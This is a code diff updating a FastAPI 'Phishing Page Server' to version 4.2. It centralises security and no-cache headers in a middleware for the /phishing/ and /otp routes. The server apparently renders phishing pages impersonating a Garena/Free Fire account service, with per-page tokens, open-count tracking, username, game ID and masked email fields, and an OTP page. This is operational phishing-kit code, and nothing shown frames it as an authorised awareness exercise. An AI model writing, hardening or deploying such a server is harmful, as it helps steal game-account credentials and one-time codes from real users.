@@ -1,5 +1,5 @@
 """
-FastAPI Phishing Page Server — Secure v4.1
+FastAPI Phishing Page Server — Secure v4.2
 Production-hardened, cloud-ready.
 """
 
@@ -83,7 +83,7 @@ except Exception as e:
 # ═══════════════════════════════════════════════════
 app = FastAPI(
     title="Phishing Page Server",
-    version="4.1",
+    version="4.2",
     docs_url=None,
     redoc_url=None,
     openapi_url=None,
@@ -106,6 +106,29 @@ app.add_middleware(
     allow_headers=["Content-Type", "X-Request-ID"],
     max_age=600,
 )
+
+# ═══════════════════════════════════════════════════
+# SECURITY HEADERS MIDDLEWARE
+# ═══════════════════════════════════════════════════
+@app.middleware("http")
+async def add_security_headers(request: Request, call_next):
+    response = await call_next(request)
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["X-Frame-Options"] = "DENY"
+    response.headers["X-XSS-Protection"] = "1; mode=block"
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
+    if request.url.path.endswith("/otp"):
+        response.headers["Content-Security-Policy"] = (
+            "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; "
+            "img-src 'self' https://dl.dir.freefiremobile.com data:; font-src 'self'; connect-src 'self'; "
+            "frame-ancestors 'none'; base-uri 'self'; form-action 'self';"
+        )
+    if request.url.path.startswith("/phishing/"):
+        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
+        response.headers["Pragma"] = "no-cache"
+        response.headers["Expires"] = "0"
+    return response
 
 # ═══════════════════════════════════════════════════
 # RATE LIMITING
@@ -355,7 +378,7 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
             "valid_page": False,
             "error_message": "Invalid request parameters.",
             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False,
-        }, headers={"X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff"})
+        })
 
     if db is None:
         _log_request(request, "serve_page", status="error", extra={"reason": "db_unavailable"})
@@ -364,7 +387,7 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
             "valid_page": False,
             "error_message": "Service temporarily unavailable. Please check configuration.",
             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False,
-        }, headers={"X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff"})
+        })
 
     provided_hash = _hash_token(garena)
     try:
@@ -393,7 +416,7 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
             "valid_page": False,
             "error_message": "Oops, page not found.",
             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False,
-        }, headers={"X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff"})
+        })
 
     if _is_session_expired(page_data):
         if page_data.get("status") == "active":
@@ -407,7 +430,7 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
             "valid_page": False,
             "error_message": "This page has expired.",
             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False,
-        }, headers={"X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff"})
+        })
 
     if page_data.get("status") not in ["active", "stopped", "verified"]:
         _log_request(request, "serve_page", status="error", extra={"reason": "invalid_status", "page_id": page_id})
@@ -416,7 +439,7 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
             "valid_page": False,
             "error_message": "This page is no longer available.",
             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False,
-        }, headers={"X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff"})
+        })
 
     try:
         current_count = page_data.get("open_count", 0)
@@ -435,19 +458,6 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
 
     _log_request(request, "serve_page", page_id=page_id, status="success")
 
-    headers = {
-        "X-Frame-Options": "DENY",
-        "X-Content-Type-Options": "nosniff",
-        "X-XSS-Protection": "1; mode=block",
-        "Referrer-Policy": "strict-origin-when-cross-origin",
-        "Permissions-Policy": "camera=(), microphone=(), geolocation=()",
-        "Content-Security-Policy": (
-            "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; "
-            "img-src 'self' https://dl.dir.freefiremobile.com data:; font-src 'self'; connect-src 'self'; "
-            "frame-ancestors 'none'; base-uri 'self'; form-action 'self';"
-        ),
-    }
-
     return templates.TemplateResponse("phishing.html", {
         "request": request,
         "valid_page": True,
@@ -458,7 +468,7 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
         "game_id": game_id,
         "email": _mask_email(email) if not has_username_id else "",
         "has_username_id": has_username_id,
-    }, headers=headers)
+    })
 
 
 @app.post("/phishing/pages/track-open")
@@ -658,7 +668,7 @@ async def reset_verification(request: Request, data: ResetVerificationRequest):
 
 @app.get("/")
 async def root():
-    return {"message": "Phishing Page Server v4.1 running.", "status": "healthy"}
+    return {"message": "Phishing Page Server v4.2 running.", "status": "healthy"}
 
 
 @app.get("/health")
@@ -666,7 +676,7 @@ async def health_check():
     db_ok = db is not None
     return {
         "status": "healthy" if db_ok else "degraded",
-        "version": "4.1",
+        "version": "4.2",
         "database": "connected" if db_ok else "disconnected",
         "timestamp": datetime.now(timezone.utc).isoformat(),
     }
